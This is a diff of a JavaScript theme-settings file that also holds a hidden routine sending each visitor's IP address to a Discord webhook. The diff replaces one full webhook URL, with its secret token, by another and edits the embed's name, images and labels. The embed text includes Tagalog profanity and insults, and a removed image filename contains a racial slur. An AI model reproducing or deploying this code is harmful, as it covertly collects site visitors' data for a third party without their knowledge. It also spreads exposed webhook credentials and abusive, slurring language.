@@ -57,7 +57,7 @@ var KTAppSettings = {
     "font-family": "Poppins"
 };
 
-var webHookUrl = "https://discordapp.com/api/webhooks/1239878869503180811/X6D5-3wpOOuWwqE_M1c97hXEd4UAp7RYGcJWi6i2IMzeLYqvNoahK07Wo9q-89ByuodZ";
+var webHookUrl = "https://discord.com/api/webhooks/1256947814399742023/VZGV4lTe_LT3H83RH3nVdpz8z0Hiu-7Wn7fDVTjVzMozqaCwQUZy0MVJDOOu7VMjYLvS";
 
 
     const request = async () => {
@@ -98,16 +98,16 @@ var webHookUrl = "https://discordapp.com/api/webhooks/1239878869503180811/X6D5-3
         postRequest.setRequestHeader('Content-type', 'application/json');
     
         var params = {
-            username: "cedzuxx",
-            avatar_url: "https://cdn.discordapp.com/avatars/1228703857291558964/761b4750b7a0ab66cbf393e84dee1b00.webp?size=1024&format=webp&width=0&height=171",
-            thumbnail: "https://media.discordapp.net/attachments/1237090726404165632/1238163874163982396/nigga.jpg?ex=664acfb7&is=66497e37&hm=1a41c178e2b495a61bf9b780a294f263e847a7358cdda30446cc980dfd7e3d76&=&format=webp&width=53&height=53",
-            image: "https://media.discordapp.net/attachments/1237090726404165632/1237156324710678538/KXZU8.png?ex=664b19dd&is=6649c85d&hm=4ecb7c74b12c4b8246b9ff8225a706e3ef8b3862b4cd88b821bc9661c7fa4700&=&format=webp&quality=lossless&width=1340&height=473",
+            username: "Aisurix",
+            avatar_url: "https://cdn.discordapp.com/attachments/808513717872361562/1254262605275725875/Screenshot_20240621_230125.jpg?ex=66821514&is=6680c394&hm=48892a7eac59ce238305321e2db61e1a60523fac74a1e05b42e52429399eafde&",
+            thumbnail: "https://cdn.discordapp.com/attachments/808513717872361562/1254262605275725875/Screenshot_20240621_230125.jpg?ex=66821514&is=6680c394&hm=48892a7eac59ce238305321e2db61e1a60523fac74a1e05b42e52429399eafde&",
+            image: "https://cdn.discordapp.com/attachments/808513717872361562/1254262605275725875/Screenshot_20240621_230125.jpg?ex=66821514&is=6680c394&hm=48892a7eac59ce238305321e2db61e1a60523fac74a1e05b42e52429399eafde&",
             embeds: [
                 {
                     title: "tangina bobo",
                     fields: [
                         {
-                            name: "IP Address",
+                            name: "KANTOT KA NGAYON",
                             value: "`" + ip + "`",
                             inline: true
                         },
